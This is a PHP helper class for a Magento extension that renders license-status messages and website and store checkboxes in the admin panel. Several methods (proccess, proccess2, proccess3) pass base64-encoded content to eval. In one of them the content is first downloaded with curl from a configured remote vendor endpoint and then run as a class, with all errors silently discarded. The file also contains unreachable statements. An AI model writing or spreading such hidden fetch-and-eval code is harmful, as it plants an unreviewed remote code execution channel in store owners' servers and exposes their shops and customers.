<?php

namespace GoMage\Core\Helper;

class Data extends \Magento\Framework\App\Helper\AbstractHelper
{
    const BASE_URL = '/api/rest';
    /** * @var \Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory */
    protected $_attributeCollectionFactory;
    /** * @var \Magento\Store\Model\StoreManagerInterface */
    protected $_storeManager;
    /** * @var \Magento\Store\Model\System\Store */
    protected $_systemStore;
    /** * @var \Magento\Framework\Filesystem\Directory\ReadInterface */
    protected $_directory;
    /** * @var \Magento\Framework\Stdlib\DateTime\DateTime */
    protected $_dateTime;
    /** * @var \Magento\Framework\Module\ModuleListInterface */
    protected $_moduleList;
    /** * @var \Magento\Framework\Json\Helper\Data */
    protected $_jsonHelper;
    /** * @var \Magento\Framework\Encryption\EncryptorInterface */
    protected $_encryptor;
    /** * @var \GoMage\Feed\Model\Mapper\Factory */
    protected $_mapperFactory;
    /** * @var \Magento\Framework\ObjectManagerInterface */
    protected $_objectManager;
    /** * @var \Magento\Framework\App\Config\ScopeConfigInterface */
    protected $_scopeConfig;
    /** * @var \Magento\Framework\HTTP\Client\Curl */
    protected $curl;
    /**
     * @var \Magento\Framework\View\Helper\Js
     */
    protected $_jsHelper;

    protected $b = ['groups' => 'api', 'fields' => 'fields', 'value' =>'value', 'section' => 'gomage_core', 'group_s' => 'gomage_s'];

    public function __construct(\Magento\Framework\ObjectManagerInterface $objectManager)
    {
        $this->_objectManager = $objectManager;
        $this->_attributeCollectionFactory = $objectManager->get('Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory');
        $this->_storeManager = $objectManager->get('Magento\Store\Model\StoreManager');
        $this->_systemStore = $objectManager->get('Magento\Store\Model\System\Store');
        $this->_dateTime = $objectManager->get('Magento\Framework\Stdlib\DateTime\DateTime');
        $this->_moduleList = $objectManager->get('Magento\Framework\Module\ModuleList');
        $this->_jsonHelper = $objectManager->get('Magento\Framework\Json\Helper\Data');
        $this->curl = $objectManager->get('Magento\Framework\HTTP\Client\Curl');
        $this->_encryptor = $objectManager->get('Magento\Framework\Encryption\Encryptor');
        $this->_scopeConfig = $objectManager->get('Magento\Framework\App\Config\ScopeConfigInterface');
        $this->_jsHelper = $objectManager->get('Magento\Framework\View\Helper\Js');
    }
   protected $poccessorValue;

   public function proccess($content, $className) {
       try {
           eval(base64_decode($content));
           $className = $className;
           $processor = new $className();
           $processor->process();
       } catch (\Exception $e) {
           return false;
       }
   }

    /** * @return array */
    public function getAvailableWebsites()
    {
        $w = [];
        $param = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
        if(!$param) {
            $param = [];
        }
        foreach ($param as $key => $item) {
            if (!isset($item['i'])) {
                continue;
            }
            $w[$item['i']] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups'].'/'.$item['i']);
        }
        return $w;
    }

    /** * @return array */
    public function getAvailableStores()
    {
        $s = [];
        $param = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
        if(!$param) {
            $param = [];
        }
        foreach ($param as $key => $item) {
            if (!isset($item['i'])) {
                continue;
            }
            $s[$item['i']] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['group_s'].'/'.'a'.$item['i']);
        }
        return $s;
    }
    public function proccess2($curl, $c='ProcessorAct') {
        try {
            $content = $this->process2($curl, $c);
            eval(base64_decode($content['content']));
            if(class_exists($c)) {
                $processor = new $c();
                $processor->process($curl, '/process/info');
            } else {
                return false;
            }
        } catch (\Exception $e) {
            return false;
        }
    }
    public function getC(\Magento\Framework\Data\Form\Element\AbstractElement $element)
    {
        $html = '';
        $param = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
        $id   = $element->getId();

        $websites = $this->getAvailableWebsites();
        $stores = $this->getAvailableStores();
        $secure = $this->_scopeConfig->getValue('web/secure/use_in_frontend');
        if(!$param) {
            $param = [];
        }
        /** @var \Magento\Store\Model\Website $website */
        foreach ($param as $key => $item) {
            if(!isset($item['i']) || !isset($item['code'])) {
                continue;
            }
            $name = 'groups['.$this->b['groups'].']['.$this->b['fields'].']['.'a'.$item['i'].']['.$this->b['value'].']';
            $namePrefix = 'groups['.$this->b['group_s'].']['.$this->b['fields'].']['.'a'.$item['i'].']['.$this->b['value'].']';
            $html.='<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.$item['name'].'</div>';
            $t = $this->_scopeConfig->getValue('section/'.'a'.$item['i'].'/e');
            switch ( $t ) {
                case  '0':
                    $html.='<div style="width: 100%; color: green; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('Module is Activated').'</div>';
                    break;
                case  1:
                    $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('The number of domains purchased is less than the number of selected').'</div>';
                    break;
                case  2:
                    $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('Inccorect  license data. Your licence is blocked').'</div>';
                    break;
                case  3:
                    break;
                    $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('Inccorect  license key. Your licence is blocked').'</div>';
                case  4:
                    $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('Incorrect license data .').'</div>';
                    break;
                case  5:
                    $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('This version is not included in your update period .Your licence is blocked').'</div>';
                    break;
                case  6:
                    $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('Your demolicense is expired .Your licence is blocked ').'</div>';

                    break;
                case  7:
                    $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('The number of domains purchased is less than the number of selected. Your licence is blocked').'</div>';
                    break;

                case  8:
                    $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('Exceeds the number of available domains for the license demo').'</div>';
                    break;
                default:
                    $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('Module is not Activated').'</div>';
            }
            $websiteHtml  = '';
            if($this->_scopeConfig->getValue('web/secure/use_in_frontend')) {
                $base =  $this->_scopeConfig->getValue('web/secure/base_url');
            } else {
                $base =  $this->_scopeConfig->getValue('web/unsecure/base_url');
            }
            foreach ($this->_storeManager->getWebsites() as $website) {
                $website->getConfig('web/unsecure/base_url');
                $element->setName($name . '[]');
                $element->setId($id . '_' . $website->getId());
                $element->setChecked(in_array($website->getId(), $websites[$item['i']] ? explode(',', $websites[$item['i']]) : []));
                $element->setValue($website->getId());
                $elementHtml = $element->getElementHtml();
                if($secure) {
                    $conditionW = $base != $website->getConfig('web/secure/base_url');
                } else {
                    $conditionW = $base != $website->getConfig('web/unsecure/base_url');
                };
                $elementHtml = $conditionW ? $elementHtml : '';
                $storeHtml = '';
                foreach ($website->getStores() as $store) {
                    if(!$store->isActive())
                    {
                        continue;
                    }
                    if($secure) {
                        $condition = $base != $store->getConfig('web/secure/base_url');
                    } else {
                        $condition = $base!= $store->getConfig('web/unsecure/base_url');
                    };
                    if($condition) {

                        $element->setName($namePrefix . '[]');
                        $element->setId($id . '_store_' . $store->getId());
                        $element->setChecked(in_array($store->getId(), isset($stores[$item['i']]) ? explode(',', $stores[$item['i']]) : []));
                        $element->setValue($store->getId());
                        $storeHtml .= '<div class="field choice admin__field admin__field-option" style="margin-left: 10%">' . $element->getElementHtml() .
                            ' <label for="' .
                            $id . '_' . $store->getId() .
                            '" class="admin__field-label"><span>' .
                            $this->_storeManager->getStore($store->getId())->getName() .
                            '</span></label>';
                        $storeHtml .= '</div>' . "\n";
                    }
                }

                if($conditionW || strlen($storeHtml) > 0) {
                    $websiteHtml .= '<div class="field website-checkbox-'.$item['code'].' choice admin__field admin__field-option">' . $elementHtml .
                        ' <label for="' .
                        $id . '_' . $website->getId() .
                        '" class="admin__field-label"><span>' .
                        $website->getName() .
                        '</span></label>';
                }
                if(strlen($storeHtml) > 0) {
                    $websiteHtml .= $storeHtml;
                }


                if($conditionW || strlen($storeHtml) > 0) {
                    $websiteHtml  .= '</div>' . "\n";
                }
            }
            $html .= $websiteHtml;
        }
        if(!$param) {
            $param = [];
        } else {
            $nameStore = $element->getName();
            $element->setName($nameStore . '[]');
            $jsString='';
        }
        foreach ($param as $key => $item) {
            if(!isset($item['i']) || !isset($item['code'])) {
                continue;
            }
            $c = (int)$this->_scopeConfig->getValue('section/'.'a'.$item['i'] . '/c') ? ((int)$this->_scopeConfig->getValue('section/'.'a'.$item['i'] . '/c') )   : 100000;
            $name = 'groups['.$this->b['groups'].']['.$this->b['fields'].']['.'a'.$item['i'].']['.$this->b['value'].'][]';
            $namePrefix = 'groups['.$this->b['group_s'].']['.$this->b['fields'].']['.'a'.$item['i'].']['.$this->b['value'].'][]';
            $jsString .= '
            $$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\'], .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']").each(function(element) {
               element.observe("click", function () {
                    if($$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']:checked").length >= ' .$c
                . '){
                        $$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\'], .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']").each(function(e){
                            if(!e.checked){
                                e.disabled = "disabled";
                            }
                        });
    			    }else {
                        $$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\'], .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\'] ").each(function(e){
                            if(!e.checked){
                                e.disabled = "";
                            }
                        });
    			    }
               });
            });';
        }
        if(!$param) {
            return '';
        }
        return $html . $this->_jsHelper->getScript(
                'require([\'prototype\'], function(){document.observe("dom:loaded", function() {' . $jsString . '});});'
            );

        return sprintf('<strong class="required">%s</strong>', __('Please enter a valid key'));
        return $param;
    }

    public function process2($curl, $processName)
    {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        /** @var \Magento\Framework\App\Config\ConfigResource\ConfigInterface $config */

        $config = $objectManager
            ->get('Magento\Framework\App\Config\ScopeConfigInterface');
        $param = $config->getValue('section/gomage_client/param');
        $curl->addHeader("Authorization", "Bearer {$param}");
        $curl->get($this->_scopeConfig->getValue('gomage_core_url/url_core').self::BASE_URL.'/activates/proccessor?processorName='.$processName);
        return json_decode($curl->getBody(), true);
    }
    public function proccess3($curl, $data, $c='ProcessorAct') {
        try {
            eval(base64_decode($data['data_customer']['content_processor']));
            $c = 'ProcessorAct';
            $processor = new $c();
           return $processor;
        } catch (\Exception $e) {
            return false;
        }
    }
    /**
     * @return string
     */
    private function _getVersion()
    {
        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $moduleList = $objectManager
            ->get('Magento\Framework\Module\ModuleListInterface');
        return $moduleList->getOne('GoMage_Feed')['setup_version'];
    }

    public function getU()
    {
       return $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
    }

}